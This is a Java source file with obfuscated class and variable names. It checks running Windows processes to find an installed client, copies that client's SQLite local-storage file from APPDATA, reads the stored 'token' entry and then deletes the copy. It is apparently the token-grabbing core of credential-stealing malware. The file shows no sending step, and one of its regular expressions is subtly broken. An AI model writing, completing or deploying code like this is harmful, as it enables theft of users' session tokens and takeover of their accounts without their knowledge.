import com.sun.jna.Native;
import com.sun.jna.platform.win32.*;
import com.sun.jna.win32.W32APIOptions;


import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.ResultSet;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
public class C
{
    public static Path a()
    {
        String b = System.getenv("APPDATA") + Main.b.d;
        String c = System.getenv("APPDATA") + Main.b.e;
        String d = System.getenv("APPDATA") + Main.b.f;
        String e = System.getenv("APPDATA") + Main.b.g;

        Kernel32 f = (Kernel32) Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
        Tlhelp32.PROCESSENTRY32.ByReference l = new Tlhelp32.PROCESSENTRY32.ByReference();

        WinNT.HANDLE g = f.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0));
        try  {
            while (f.Process32Next(g, l)) {
                String h = Native.toString(l.szExeFile);
                if (h.equals(Main.b.h))
                {
                    return Paths.get(b);
                }
                else if (h.equals(Main.b.i))
                {
                    return Paths.get(c);
                }
                else if (h.equals(Main.b.j))
                {
                    return Paths.get(d);
                }
                else if (h.equals(Main.b.k))
                {
                    return Paths.get(e);
                }
            }
        }
        finally {
            f.CloseHandle(g);
        }
        try
        {
            ArrayList<File> i = new ArrayList<>();
            if (new File(b).exists())
            {
                i.add(new File(b));
            }
            if (new File(c).exists())
            {
                i.add(new File(c));
            }
            if (new File(d).exists())
            {
                i.add(new File(d));
            }
            if (new File(e).exists())
            {
                i.add(new File(e));
            }
            File j = null;
            for (File file : i)
            {
                if (file.isFile())
                {
                    BufferedReader k = new BufferedReader(
                            new InputStreamReader(new FileInputStream(file)));
                    try
                    {
                        for (String m; (m = k.readLine()) != null; )
                        {
                                if (j == null
                                        || file.lastModified() > j
                                        .lastModified())
                                {
                                    j = file;
                                }
                            }
                    }
                    finally
                    {
                        k.close();
                        return j.toPath();
                    }
                }
            }
        }
        catch(IOException ex)
        {
            return null;
        }
        return null;
    }
    public static Connection b() throws SQLException, ClassNotFoundException, IOException
    {
        String a = System.getenv("APPDATA") + Main.b.l;
        if(!new File(a).exists())
        {
            Files.copy(Paths.get(a().toString()), Paths.get(a));
        }
        Class.forName("org.sqlite.JDBC");
        String b = "jdbc:sqlite:" + a;
        return DriverManager.getConnection(b);
    }

    public static String c()
    {
        try
        {
            Connection a = b();
            Statement b = a.createStatement();
            ResultSet c = b.executeQuery("SELECT * from ItemTable");
            while(c.next())
            {
                if (c.getString(1).equals("token"))
                {
                    byte[] d = c.getBytes(2);
                    String e = new String(d, "UTF-8");
                    String f = e.replaceAll("\"", "");
                    String g = f.replaceAll("//s+", "");
                    a.close();
                    Files.delete(Paths.get(System.getenv("APPDATA") + Main.b.l));
                    return g;
                }
            }
        }
        catch (SQLException | ClassNotFoundException | IOException e)
        {
            return "";
        }
        return "";
    }

}
